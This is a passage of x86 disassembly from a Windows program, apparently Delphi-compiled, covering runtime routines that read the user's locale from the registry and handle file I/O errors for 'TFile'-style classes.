  406f4d:	eb f0                	jmp    0x406f3f
  406f4f:	8b c3                	mov    %ebx,%eax
  406f51:	5f                   	pop    %edi
  406f52:	5e                   	pop    %esi
  406f53:	5b                   	pop    %ebx
  406f54:	8b e5                	mov    %ebp,%esp
  406f56:	5d                   	pop    %ebp
  406f57:	c2 08 00             	ret    $0x8
  406f5a:	8b c0                	mov    %eax,%eax
  406f5c:	6a 01                	push   $0x1
  406f5e:	6a 02                	push   $0x2
  406f60:	e8 ab fe ff ff       	call   0x406e10
  406f65:	c3                   	ret
  406f66:	8b c0                	mov    %eax,%eax
  406f68:	55                   	push   %ebp
  406f69:	8b ec                	mov    %esp,%ebp
  406f6b:	56                   	push   %esi
  406f6c:	8b 75 0c             	mov    0xc(%ebp),%esi
  406f6f:	3c 02                	cmp    $0x2,%al
  406f71:	75 06                	jne    0x406f79
  406f73:	81 ce 00 01 00 00    	or     $0x100,%esi
  406f79:	8b 45 08             	mov    0x8(%ebp),%eax
  406f7c:	50                   	push   %eax
  406f7d:	56                   	push   %esi
  406f7e:	8b 45 10             	mov    0x10(%ebp),%eax
  406f81:	50                   	push   %eax
  406f82:	51                   	push   %ecx
  406f83:	52                   	push   %edx
  406f84:	e8 2b d4 ff ff       	call   0x4043b4
  406f89:	5e                   	pop    %esi
  406f8a:	5d                   	pop    %ebp
  406f8b:	c2 0c 00             	ret    $0xc
  406f8e:	8b c0                	mov    %eax,%eax
  406f90:	8b 10                	mov    (%eax),%edx
  406f92:	33 c9                	xor    %ecx,%ecx
  406f94:	89 08                	mov    %ecx,(%eax)
  406f96:	8b c2                	mov    %edx,%eax
  406f98:	e8 87 b9 ff ff       	call   0x402924
  406f9d:	c3                   	ret
  406f9e:	8b c0                	mov    %eax,%eax
  406fa0:	55                   	push   %ebp
  406fa1:	8b ec                	mov    %esp,%ebp
  406fa3:	83 c4 f4             	add    $0xfffffff4,%esp
  406fa6:	53                   	push   %ebx
  406fa7:	8b d8                	mov    %eax,%ebx
  406fa9:	52                   	push   %edx
  406faa:	e8 1d d5 ff ff       	call   0x4044cc
  406faf:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406fb2:	33 c0                	xor    %eax,%eax
  406fb4:	55                   	push   %ebp
  406fb5:	68 12 70 40 00       	push   $0x407012
  406fba:	64 ff 30             	push   %fs:(%eax)
  406fbd:	64 89 20             	mov    %esp,%fs:(%eax)
  406fc0:	d9 7d fe             	fnstcw -0x2(%ebp)
  406fc3:	33 c0                	xor    %eax,%eax
  406fc5:	55                   	push   %ebp
  406fc6:	68 f4 6f 40 00       	push   $0x406ff4
  406fcb:	64 ff 30             	push   %fs:(%eax)
  406fce:	64 89 20             	mov    %esp,%fs:(%eax)
  406fd1:	8b c3                	mov    %ebx,%eax
  406fd3:	e8 3c c4 ff ff       	call   0x403414
  406fd8:	50                   	push   %eax
  406fd9:	e8 be d4 ff ff       	call   0x40449c
  406fde:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406fe1:	33 c0                	xor    %eax,%eax
  406fe3:	5a                   	pop    %edx
  406fe4:	59                   	pop    %ecx
  406fe5:	59                   	pop    %ecx
  406fe6:	64 89 10             	mov    %edx,%fs:(%eax)
  406fe9:	68 fb 6f 40 00       	push   $0x406ffb
  406fee:	db e2                	fnclex
  406ff0:	d9 6d fe             	fldcw  -0x2(%ebp)
  406ff3:	c3                   	ret
  406ff4:	e9 03 be ff ff       	jmp    0x402dfc
  406ff9:	eb f3                	jmp    0x406fee
  406ffb:	33 c0                	xor    %eax,%eax
  406ffd:	5a                   	pop    %edx
  406ffe:	59                   	pop    %ecx
  406fff:	59                   	pop    %ecx
  407000:	64 89 10             	mov    %edx,%fs:(%eax)
  407003:	68 19 70 40 00       	push   $0x407019
  407008:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40700b:	50                   	push   %eax
  40700c:	e8 bb d4 ff ff       	call   0x4044cc
  407011:	c3                   	ret
  407012:	e9 e5 bd ff ff       	jmp    0x402dfc
  407017:	eb ef                	jmp    0x407008
  407019:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40701c:	5b                   	pop    %ebx
  40701d:	8b e5                	mov    %ebp,%esp
  40701f:	5d                   	pop    %ebp
  407020:	c3                   	ret
  407021:	8d 40 00             	lea    0x0(%eax),%eax
  407024:	55                   	push   %ebp
  407025:	8b ec                	mov    %esp,%ebp
  407027:	83 c4 f0             	add    $0xfffffff0,%esp
  40702a:	53                   	push   %ebx
  40702b:	56                   	push   %esi
  40702c:	57                   	push   %edi
  40702d:	33 c0                	xor    %eax,%eax
  40702f:	89 45 f0             	mov    %eax,-0x10(%ebp)
  407032:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407035:	33 c0                	xor    %eax,%eax
  407037:	55                   	push   %ebp
  407038:	68 29 71 40 00       	push   $0x407129
  40703d:	64 ff 30             	push   %fs:(%eax)
  407040:	64 89 20             	mov    %esp,%fs:(%eax)
  407043:	68 3c 71 40 00       	push   $0x40713c
  407048:	68 58 71 40 00       	push   $0x407158
  40704d:	e8 0a d4 ff ff       	call   0x40445c
  407052:	50                   	push   %eax
  407053:	e8 0c d4 ff ff       	call   0x404464
  407058:	8b d8                	mov    %eax,%ebx
  40705a:	85 db                	test   %ebx,%ebx
  40705c:	74 09                	je     0x407067
  40705e:	ff d3                	call   *%ebx
  407060:	8b d8                	mov    %eax,%ebx
  407062:	e9 a4 00 00 00       	jmp    0x40710b
  407067:	83 3d 7c b0 40 00 02 	cmpl   $0x2,0x40b07c
  40706e:	75 38                	jne    0x4070a8
  407070:	6a 00                	push   $0x0
  407072:	6a 01                	push   $0x1
  407074:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407077:	50                   	push   %eax
  407078:	b9 68 71 40 00       	mov    $0x407168,%ecx
  40707d:	ba 03 00 00 80       	mov    $0x80000003,%edx
  407082:	33 c0                	xor    %eax,%eax
  407084:	e8 df fe ff ff       	call   0x406f68
  407089:	85 c0                	test   %eax,%eax
  40708b:	75 51                	jne    0x4070de
  40708d:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  407090:	ba 90 71 40 00       	mov    $0x407190,%edx
  407095:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407098:	e8 bf fe ff ff       	call   0x406f5c
  40709d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4070a0:	50                   	push   %eax
  4070a1:	e8 06 d3 ff ff       	call   0x4043ac
  4070a6:	eb 36                	jmp    0x4070de
  4070a8:	6a 00                	push   $0x0
  4070aa:	6a 01                	push   $0x1
  4070ac:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4070af:	50                   	push   %eax
  4070b0:	b9 98 71 40 00       	mov    $0x407198,%ecx
  4070b5:	ba 01 00 00 80       	mov    $0x80000001,%edx
  4070ba:	33 c0                	xor    %eax,%eax
  4070bc:	e8 a7 fe ff ff       	call   0x406f68
  4070c1:	85 c0                	test   %eax,%eax
  4070c3:	75 19                	jne    0x4070de
  4070c5:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  4070c8:	ba c0 71 40 00       	mov    $0x4071c0,%edx
  4070cd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4070d0:	e8 87 fe ff ff       	call   0x406f5c
  4070d5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4070d8:	50                   	push   %eax
  4070d9:	e8 ce d2 ff ff       	call   0x4043ac
  4070de:	ba cc 71 40 00       	mov    $0x4071cc,%edx
  4070e3:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4070e6:	e8 41 c1 ff ff       	call   0x40322c
  4070eb:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4070ee:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4070f1:	e8 06 c2 ff ff       	call   0x4032fc
  4070f6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4070f9:	8d 55 f4             	lea    -0xc(%ebp),%edx
  4070fc:	e8 b3 b6 ff ff       	call   0x4027b4
  407101:	8b d8                	mov    %eax,%ebx
  407103:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  407107:	74 02                	je     0x40710b
  407109:	33 db                	xor    %ebx,%ebx
  40710b:	33 c0                	xor    %eax,%eax
  40710d:	5a                   	pop    %edx
  40710e:	59                   	pop    %ecx
  40710f:	59                   	pop    %ecx
  407110:	64 89 10             	mov    %edx,%fs:(%eax)
  407113:	68 30 71 40 00       	push   $0x407130
  407118:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40711b:	e8 78 c0 ff ff       	call   0x403198
  407120:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407123:	e8 70 c0 ff ff       	call   0x403198
  407128:	c3                   	ret
  407129:	e9 ce bc ff ff       	jmp    0x402dfc
  40712e:	eb e8                	jmp    0x407118
  407130:	8b c3                	mov    %ebx,%eax
  407132:	5f                   	pop    %edi
  407133:	5e                   	pop    %esi
  407134:	5b                   	pop    %ebx
  407135:	8b e5                	mov    %ebp,%esp
  407137:	5d                   	pop    %ebp
  407138:	c3                   	ret
  407139:	00 00                	add    %al,(%eax)
  40713b:	00 47 65             	add    %al,0x65(%edi)
  40713e:	74 55                	je     0x407195
  407140:	73 65                	jae    0x4071a7
  407142:	72 44                	jb     0x407188
  407144:	65 66 61             	gs popaw
  407147:	75 6c                	jne    0x4071b5
  407149:	74 55                	je     0x4071a0
  40714b:	49                   	dec    %ecx
  40714c:	4c                   	dec    %esp
  40714d:	61                   	popa
  40714e:	6e                   	outsb  %ds:(%esi),(%dx)
  40714f:	67 75 61             	addr16 jne 0x4071b3
  407152:	67 65 00 00          	add    %al,%gs:(%bx,%si)
  407156:	00 00                	add    %al,(%eax)
  407158:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  40715c:	65 6c                	gs insb (%dx),%es:(%edi)
  40715e:	33 32                	xor    (%edx),%esi
  407160:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  407163:	6c                   	insb   (%dx),%es:(%edi)
  407164:	00 00                	add    %al,(%eax)
  407166:	00 00                	add    %al,(%eax)
  407168:	2e 44                	cs inc %esp
  40716a:	45                   	inc    %ebp
  40716b:	46                   	inc    %esi
  40716c:	41                   	inc    %ecx
  40716d:	55                   	push   %ebp
  40716e:	4c                   	dec    %esp
  40716f:	54                   	push   %esp
  407170:	5c                   	pop    %esp
  407171:	43                   	inc    %ebx
  407172:	6f                   	outsl  %ds:(%esi),(%dx)
  407173:	6e                   	outsb  %ds:(%esi),(%dx)
  407174:	74 72                	je     0x4071e8
  407176:	6f                   	outsl  %ds:(%esi),(%dx)
  407177:	6c                   	insb   (%dx),%es:(%edi)
  407178:	20 50 61             	and    %dl,0x61(%eax)
  40717b:	6e                   	outsb  %ds:(%esi),(%dx)
  40717c:	65 6c                	gs insb (%dx),%es:(%edi)
  40717e:	5c                   	pop    %esp
  40717f:	49                   	dec    %ecx
  407180:	6e                   	outsb  %ds:(%esi),(%dx)
  407181:	74 65                	je     0x4071e8
  407183:	72 6e                	jb     0x4071f3
  407185:	61                   	popa
  407186:	74 69                	je     0x4071f1
  407188:	6f                   	outsl  %ds:(%esi),(%dx)
  407189:	6e                   	outsb  %ds:(%esi),(%dx)
  40718a:	61                   	popa
  40718b:	6c                   	insb   (%dx),%es:(%edi)
  40718c:	00 00                	add    %al,(%eax)
  40718e:	00 00                	add    %al,(%eax)
  407190:	4c                   	dec    %esp
  407191:	6f                   	outsl  %ds:(%esi),(%dx)
  407192:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  407195:	65 00 00             	add    %al,%gs:(%eax)
  407198:	43                   	inc    %ebx
  407199:	6f                   	outsl  %ds:(%esi),(%dx)
  40719a:	6e                   	outsb  %ds:(%esi),(%dx)
  40719b:	74 72                	je     0x40720f
  40719d:	6f                   	outsl  %ds:(%esi),(%dx)
  40719e:	6c                   	insb   (%dx),%es:(%edi)
  40719f:	20 50 61             	and    %dl,0x61(%eax)
  4071a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4071a3:	65 6c                	gs insb (%dx),%es:(%edi)
  4071a5:	5c                   	pop    %esp
  4071a6:	44                   	inc    %esp
  4071a7:	65 73 6b             	gs jae 0x407215
  4071aa:	74 6f                	je     0x40721b
  4071ac:	70 5c                	jo     0x40720a
  4071ae:	52                   	push   %edx
  4071af:	65 73 6f             	gs jae 0x407221
  4071b2:	75 72                	jne    0x407226
  4071b4:	63 65 4c             	arpl   %esp,0x4c(%ebp)
  4071b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4071b8:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4071bb:	65 00 00             	add    %al,%gs:(%eax)
  4071be:	00 00                	add    %al,(%eax)
  4071c0:	00 00                	add    %al,(%eax)
  4071c2:	00 00                	add    %al,(%eax)
  4071c4:	ff                   	(bad)
  4071c5:	ff                   	(bad)
  4071c6:	ff                   	(bad)
  4071c7:	ff 01                	incl   (%ecx)
  4071c9:	00 00                	add    %al,(%eax)
  4071cb:	00 24 00             	add    %ah,(%eax,%eax,1)
  4071ce:	00 00                	add    %al,(%eax)
  4071d0:	53                   	push   %ebx
  4071d1:	56                   	push   %esi
  4071d2:	8b da                	mov    %edx,%ebx
  4071d4:	8b f0                	mov    %eax,%esi
  4071d6:	8b c3                	mov    %ebx,%eax
  4071d8:	8b d6                	mov    %esi,%edx
  4071da:	e8 4d c0 ff ff       	call   0x40322c
  4071df:	83 3b 00             	cmpl   $0x0,(%ebx)
  4071e2:	74 18                	je     0x4071fc
  4071e4:	8b 03                	mov    (%ebx),%eax
  4071e6:	e8 65 f7 ff ff       	call   0x406950
  4071eb:	80 38 2e             	cmpb   $0x2e,(%eax)
  4071ee:	76 0c                	jbe    0x4071fc
  4071f0:	8b c3                	mov    %ebx,%eax
  4071f2:	ba 08 72 40 00       	mov    $0x407208,%edx
  4071f7:	e8 00 c1 ff ff       	call   0x4032fc
  4071fc:	5e                   	pop    %esi
  4071fd:	5b                   	pop    %ebx
  4071fe:	c3                   	ret
  4071ff:	00 ff                	add    %bh,%bh
  407201:	ff                   	(bad)
  407202:	ff                   	(bad)
  407203:	ff 01                	incl   (%ecx)
  407205:	00 00                	add    %al,(%eax)
  407207:	00 2e                	add    %ch,(%esi)
  407209:	00 00                	add    %al,(%eax)
  40720b:	00 53 56             	add    %dl,0x56(%ebx)
  40720e:	81 c4 00 ff ff ff    	add    $0xffffff00,%esp
  407214:	8b f0                	mov    %eax,%esi
  407216:	e8 81 e4 ff ff       	call   0x40569c
  40721b:	8b d8                	mov    %eax,%ebx
  40721d:	85 db                	test   %ebx,%ebx
  40721f:	75 0e                	jne    0x40722f
  407221:	8b c6                	mov    %esi,%eax
  407223:	ba 70 72 40 00       	mov    $0x407270,%edx
  407228:	e8 ff bf ff ff       	call   0x40322c
  40722d:	eb 2e                	jmp    0x40725d
  40722f:	8b c3                	mov    %ebx,%eax
  407231:	ba 50 46 40 00       	mov    $0x404650,%edx
  407236:	e8 31 b7 ff ff       	call   0x40296c
  40723b:	84 c0                	test   %al,%al
  40723d:	74 0c                	je     0x40724b
  40723f:	8b d6                	mov    %esi,%edx
  407241:	8b 43 04             	mov    0x4(%ebx),%eax
  407244:	e8 87 ff ff ff       	call   0x4071d0
  407249:	eb 12                	jmp    0x40725d
  40724b:	8b d4                	mov    %esp,%edx
  40724d:	8b 03                	mov    (%ebx),%eax
  40724f:	e8 18 b6 ff ff       	call   0x40286c
  407254:	8b d4                	mov    %esp,%edx
  407256:	8b c6                	mov    %esi,%eax
  407258:	e8 5b c0 ff ff       	call   0x4032b8
  40725d:	81 c4 00 01 00 00    	add    $0x100,%esp
  407263:	5e                   	pop    %esi
  407264:	5b                   	pop    %ebx
  407265:	c3                   	ret
  407266:	00 00                	add    %al,(%eax)
  407268:	ff                   	(bad)
  407269:	ff                   	(bad)
  40726a:	ff                   	(bad)
  40726b:	ff 12                	call   *(%edx)
  40726d:	00 00                	add    %al,(%eax)
  40726f:	00 5b 45             	add    %bl,0x45(%ebx)
  407272:	78 63                	js     0x4072d7
  407274:	65 70 74             	gs jo  0x4072eb
  407277:	4f                   	dec    %edi
  407278:	62 6a 65             	bound  %ebp,0x65(%edx)
  40727b:	63 74 3d 6e          	arpl   %esi,0x6e(%ebp,%edi,1)
  40727f:	69 6c 5d 00 00 53 81 	imul   $0xc4815300,0x0(%ebp,%ebx,2),%ebp
  407286:	c4 
  407287:	00 fc                	add    %bh,%ah
  407289:	ff                   	(bad)
  40728a:	ff 8b da 6a 00 68    	decl   0x68006ada(%ebx)
  407290:	00 04 00             	add    %al,(%eax,%eax,1)
  407293:	00 8d 54 24 08 52    	add    %cl,0x52082454(%ebp)
  407299:	6a 00                	push   $0x0
  40729b:	50                   	push   %eax
  40729c:	6a 00                	push   $0x0
  40729e:	68 00 32 00 00       	push   $0x3200
  4072a3:	e8 4c d1 ff ff       	call   0x4043f4
  4072a8:	eb 01                	jmp    0x4072ab
  4072aa:	48                   	dec    %eax
  4072ab:	85 c0                	test   %eax,%eax
  4072ad:	7e 0e                	jle    0x4072bd
  4072af:	8a 54 04 ff          	mov    -0x1(%esp,%eax,1),%dl
  4072b3:	80 fa 20             	cmp    $0x20,%dl
  4072b6:	76 f2                	jbe    0x4072aa
  4072b8:	80 fa 2e             	cmp    $0x2e,%dl
  4072bb:	74 ed                	je     0x4072aa
  4072bd:	8b d4                	mov    %esp,%edx
  4072bf:	8b cb                	mov    %ebx,%ecx
  4072c1:	91                   	xchg   %eax,%ecx
  4072c2:	e8 b1 bf ff ff       	call   0x403278
  4072c7:	81 c4 00 04 00 00    	add    $0x400,%esp
  4072cd:	5b                   	pop    %ebx
  4072ce:	c3                   	ret
  4072cf:	90                   	nop
  4072d0:	25 ff 00 00 00       	and    $0xff,%eax
  4072d5:	0f a3 02             	bt     %eax,(%edx)
  4072d8:	0f 92 c0             	setb   %al
  4072db:	c3                   	ret
	...
  4072f4:	24 73                	and    $0x73,%al
  4072f6:	40                   	inc    %eax
  4072f7:	00 04 00             	add    %al,(%eax,%eax,1)
  4072fa:	00 00                	add    %al,(%eax)
  4072fc:	3c 10                	cmp    $0x10,%al
  4072fe:	40                   	inc    %eax
  4072ff:	00 c4                	add    %al,%ah
  407301:	29 40 00             	sub    %eax,0x0(%eax)
  407304:	ac                   	lods   %ds:(%esi),%al
  407305:	28 40 00             	sub    %al,0x0(%eax)
  407308:	d4 28                	aam    $0x28
  40730a:	40                   	inc    %eax
  40730b:	00 18                	add    %bl,(%eax)
  40730d:	29 40 00             	sub    %eax,0x0(%eax)
  407310:	30 73 40             	xor    %dh,0x40(%ebx)
  407313:	00 38                	add    %bh,(%eax)
  407315:	73 40                	jae    0x407357
  407317:	00 40 73             	add    %al,0x73(%eax)
  40731a:	40                   	inc    %eax
  40731b:	00 48 73             	add    %cl,0x73(%eax)
  40731e:	40                   	inc    %eax
  40731f:	00 50 73             	add    %dl,0x73(%eax)
  407322:	40                   	inc    %eax
  407323:	00 0b                	add    %cl,(%ebx)
  407325:	54                   	push   %esp
  407326:	43                   	inc    %ebx
  407327:	75 73                	jne    0x40739c
  407329:	74 6f                	je     0x40739a
  40732b:	6d                   	insl   (%dx),%es:(%edi)
  40732c:	46                   	inc    %esi
  40732d:	69 6c 65 e9 cb b3 ff 	imul   $0xffffb3cb,-0x17(%ebp,%eiz,2),%ebp
  407334:	ff 
  407335:	8d 40 00             	lea    0x0(%eax),%eax
  407338:	e9 c3 b3 ff ff       	jmp    0x402700
  40733d:	8d 40 00             	lea    0x0(%eax),%eax
  407340:	e9 bb b3 ff ff       	jmp    0x402700
  407345:	8d 40 00             	lea    0x0(%eax),%eax
  407348:	e9 b3 b3 ff ff       	jmp    0x402700
  40734d:	8d 40 00             	lea    0x0(%eax),%eax
  407350:	e9 ab b3 ff ff       	jmp    0x402700
  407355:	8d 40 00             	lea    0x0(%eax),%eax
	...
  407370:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407371:	73 40                	jae    0x4073b3
  407373:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407376:	00 00                	add    %al,(%eax)
  407378:	10 73 40             	adc    %dh,0x40(%ebx)
  40737b:	00 c4                	add    %al,%ah
  40737d:	29 40 00             	sub    %eax,0x0(%eax)
  407380:	ac                   	lods   %ds:(%esi),%al
  407381:	28 40 00             	sub    %al,0x0(%eax)
  407384:	d4 28                	aam    $0x28
  407386:	40                   	inc    %eax
  407387:	00 48 75             	add    %cl,0x75(%eax)
  40738a:	40                   	inc    %eax
  40738b:	00 c4                	add    %al,%ah
  40738d:	75 40                	jne    0x4073cf
  40738f:	00 fc                	add    %bh,%ah
  407391:	75 40                	jne    0x4073d3
  407393:	00 2c 76             	add    %ch,(%esi,%esi,2)
  407396:	40                   	inc    %eax
  407397:	00 6c 76 40          	add    %ch,0x40(%esi,%esi,2)
  40739b:	00 c8                	add    %cl,%al
  40739d:	76 40                	jbe    0x4073df
  40739f:	00 78 75             	add    %bh,0x75(%eax)
  4073a2:	40                   	inc    %eax
  4073a3:	00 05 54 46 69 6c    	add    %al,0x6c694654
  4073a9:	65 8b c0             	gs mov %eax,%eax
	...
  4073c4:	e0 73                	loopne 0x407439
  4073c6:	40                   	inc    %eax
  4073c7:	00 10                	add    %dl,(%eax)
  4073c9:	00 00                	add    %al,(%eax)
  4073cb:	00 50 46             	add    %dl,0x46(%eax)
  4073ce:	40                   	inc    %eax
  4073cf:	00 c4                	add    %al,%ah
  4073d1:	29 40 00             	sub    %eax,0x0(%eax)
  4073d4:	ac                   	lods   %ds:(%esi),%al
  4073d5:	28 40 00             	sub    %al,0x0(%eax)
  4073d8:	d4 28                	aam    $0x28
  4073da:	40                   	inc    %eax
  4073db:	00 18                	add    %bl,(%eax)
  4073dd:	29 40 00             	sub    %eax,0x0(%eax)
  4073e0:	0a 45 46             	or     0x46(%ebp),%al
  4073e3:	69 6c 65 45 72 72 6f 	imul   $0x726f7272,0x45(%ebp,%eiz,2),%ebp
  4073ea:	72 
  4073eb:	90                   	nop
  4073ec:	55                   	push   %ebp
  4073ed:	8b ec                	mov    %esp,%ebp
  4073ef:	83 c4 f4             	add    $0xfffffff4,%esp
  4073f2:	53                   	push   %ebx
  4073f3:	56                   	push   %esi
  4073f4:	57                   	push   %edi
  4073f5:	33 c9                	xor    %ecx,%ecx
  4073f7:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4073fa:	8b da                	mov    %edx,%ebx
  4073fc:	33 c0                	xor    %eax,%eax
  4073fe:	55                   	push   %ebp
  4073ff:	68 61 74 40 00       	push   $0x407461
  407404:	64 ff 30             	push   %fs:(%eax)
  407407:	64 89 20             	mov    %esp,%fs:(%eax)
  40740a:	8d 55 fc             	lea    -0x4(%ebp),%edx
  40740d:	8b c3                	mov    %ebx,%eax
  40740f:	e8 70 fe ff ff       	call   0x407284
  407414:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  407418:	75 1a                	jne    0x407434
  40741a:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40741d:	50                   	push   %eax
  40741e:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  407421:	c6 45 f8 00          	movb   $0x0,-0x8(%ebp)
  407425:	8d 55 f4             	lea    -0xc(%ebp),%edx
  407428:	33 c9                	xor    %ecx,%ecx
  40742a:	b8 78 74 40 00       	mov    $0x407478,%eax
  40742f:	e8 50 dd ff ff       	call   0x405184
  407434:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407437:	b2 01                	mov    $0x1,%dl
  407439:	b8 e0 73 40 00       	mov    $0x4073e0,%eax
  40743e:	e8 3d e4 ff ff       	call   0x405880
  407443:	89 58 0c             	mov    %ebx,0xc(%eax)
  407446:	e8 69 ba ff ff       	call   0x402eb4
  40744b:	33 c0                	xor    %eax,%eax
  40744d:	5a                   	pop    %edx
  40744e:	59                   	pop    %ecx
  40744f:	59                   	pop    %ecx
  407450:	64 89 10             	mov    %edx,%fs:(%eax)
  407453:	68 68 74 40 00       	push   $0x407468
  407458:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40745b:	e8 38 bd ff ff       	call   0x403198
  407460:	c3                   	ret
  407461:	e9 96 b9 ff ff       	jmp    0x402dfc
  407466:	eb f0                	jmp    0x407458
  407468:	5f                   	pop    %edi
  407469:	5e                   	pop    %esi
  40746a:	5b                   	pop    %ebx
  40746b:	8b e5                	mov    %ebp,%esp
  40746d:	5d                   	pop    %ebp
  40746e:	c3                   	ret
  40746f:	00 ff                	add    %bh,%bh
  407471:	ff                   	(bad)
  407472:	ff                   	(bad)
  407473:	ff 11                	call   *(%ecx)
  407475:	00 00                	add    %al,(%eax)
  407477:	00 46 69             	add    %al,0x69(%esi)
  40747a:	6c                   	insb   (%dx),%es:(%edi)
  40747b:	65 20 49 2f          	and    %cl,%gs:0x2f(%ecx)
  40747f:	4f                   	dec    %edi
  407480:	20 65 72             	and    %ah,0x72(%ebp)
  407483:	72 6f                	jb     0x4074f4
  407485:	72 20                	jb     0x4074a7
  407487:	25 64 00 00 00       	and    $0x64,%eax
  40748c:	53                   	push   %ebx
  40748d:	8b d8                	mov    %eax,%ebx
  40748f:	e8 b0 cf ff ff       	call   0x404444
  407494:	8b d0                	mov    %eax,%edx
  407496:	8b c3                	mov    %ebx,%eax
  407498:	e8 4f ff ff ff       	call   0x4073ec
  40749d:	5b                   	pop    %ebx
  40749e:	c3                   	ret
  40749f:	90                   	nop
  4074a0:	53                   	push   %ebx
  4074a1:	56                   	push   %esi
  4074a2:	57                   	push   %edi
  4074a3:	8b f1                	mov    %ecx,%esi
  4074a5:	8b fa                	mov    %edx,%edi
  4074a7:	8b d8                	mov    %eax,%ebx
  4074a9:	8b d7                	mov    %edi,%edx
  4074ab:	8b ce                	mov    %esi,%ecx
  4074ad:	8b c3                	mov    %ebx,%eax
  4074af:	8b 38                	mov    (%eax),%edi
  4074b1:	ff 57 08             	call   *0x8(%edi)
  4074b4:	3b f0                	cmp    %eax,%esi
  4074b6:	74 0c                	je     0x4074c4
  4074b8:	ba 26 00 00 00       	mov    $0x26,%edx
  4074bd:	8b 03                	mov    (%ebx),%eax
  4074bf:	e8 28 ff ff ff       	call   0x4073ec
  4074c4:	5f                   	pop    %edi
  4074c5:	5e                   	pop    %esi
  4074c6:	5b                   	pop    %ebx
  4074c7:	c3                   	ret
  4074c8:	83 c4 f8             	add    $0xfffffff8,%esp
  4074cb:	33 c9                	xor    %ecx,%ecx
  4074cd:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  4074d1:	89 14 24             	mov    %edx,(%esp)
  4074d4:	8b d4                	mov    %esp,%edx
  4074d6:	8b 08                	mov    (%eax),%ecx
  4074d8:	ff 51 0c             	call   *0xc(%ecx)
  4074db:	59                   	pop    %ecx
  4074dc:	5a                   	pop    %edx
  4074dd:	c3                   	ret
  4074de:	8b c0                	mov    %eax,%eax
  4074e0:	55                   	push   %ebp
  4074e1:	8b ec                	mov    %esp,%ebp
  4074e3:	51                   	push   %ecx
  4074e4:	53                   	push   %ebx
  4074e5:	56                   	push   %esi
  4074e6:	84 d2                	test   %dl,%dl
  4074e8:	74 08                	je     0x4074f2
  4074ea:	83 c4 f0             	add    $0xfffffff0,%esp
  4074ed:	e8 d6 b5 ff ff       	call   0x402ac8
  4074f2:	8b f1                	mov    %ecx,%esi
  4074f4:	88 55 ff             	mov    %dl,-0x1(%ebp)
  4074f7:	8b d8                	mov    %eax,%ebx
  4074f9:	33 d2                	xor    %edx,%edx
  4074fb:	8b c3                	mov    %ebx,%eax
  4074fd:	e8 fa b3 ff ff       	call   0x4028fc
  407502:	8a 45 0c             	mov    0xc(%ebp),%al
  407505:	50                   	push   %eax
  407506:	8a 45 08             	mov    0x8(%ebp),%al
  407509:	50                   	push   %eax
  40750a:	8a 4d 10             	mov    0x10(%ebp),%cl
  40750d:	8b d6                	mov    %esi,%edx
  40750f:	8b c3                	mov    %ebx,%eax
  407511:	8b 30                	mov    (%eax),%esi
  407513:	ff 56 14             	call   *0x14(%esi)
  407516:	89 43 04             	mov    %eax,0x4(%ebx)
  407519:	8b 43 04             	mov    0x4(%ebx),%eax
  40751c:	85 c0                	test   %eax,%eax
  40751e:	74 03                	je     0x407523
  407520:	40                   	inc    %eax
  407521:	75 07                	jne    0x40752a
  407523:	8b 03                	mov    (%ebx),%eax
  407525:	e8 62 ff ff ff       	call   0x40748c
  40752a:	c6 43 08 01          	movb   $0x1,0x8(%ebx)
  40752e:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  407532:	74 0a                	je     0x40753e
  407534:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  40753b:	83 c4 0c             	add    $0xc,%esp
  40753e:	8b c3                	mov    %ebx,%eax
  407540:	5e                   	pop    %esi
  407541:	5b                   	pop    %ebx
  407542:	59                   	pop    %ecx
  407543:	5d                   	pop    %ebp
  407544:	c2 0c 00             	ret    $0xc
  407547:	90                   	nop
  407548:	53                   	push   %ebx
  407549:	56                   	push   %esi
  40754a:	8b da                	mov    %edx,%ebx
  40754c:	8b f0                	mov    %eax,%esi
  40754e:	80 7e 08 00          	cmpb   $0x0,0x8(%esi)
  407552:	74 09                	je     0x40755d
  407554:	8b 46 04             	mov    0x4(%esi),%eax
  407557:	50                   	push   %eax
  407558:	e8 67 ce ff ff       	call   0x4043c4
  40755d:	33 d2                	xor    %edx,%edx
  40755f:	8b c6                	mov    %esi,%eax
  407561:	e8 b2 b3 ff ff       	call   0x402918
  407566:	84 db                	test   %bl,%bl
  407568:	74 07                	je     0x407571
  40756a:	8b c6                	mov    %esi,%eax
  40756c:	e8 93 b5 ff ff       	call   0x402b04
  407571:	8b c6                	mov    %esi,%eax
  407573:	5e                   	pop    %esi
  407574:	5b                   	pop    %ebx
  407575:	c3                   	ret
  407576:	8b c0                	mov    %eax,%eax
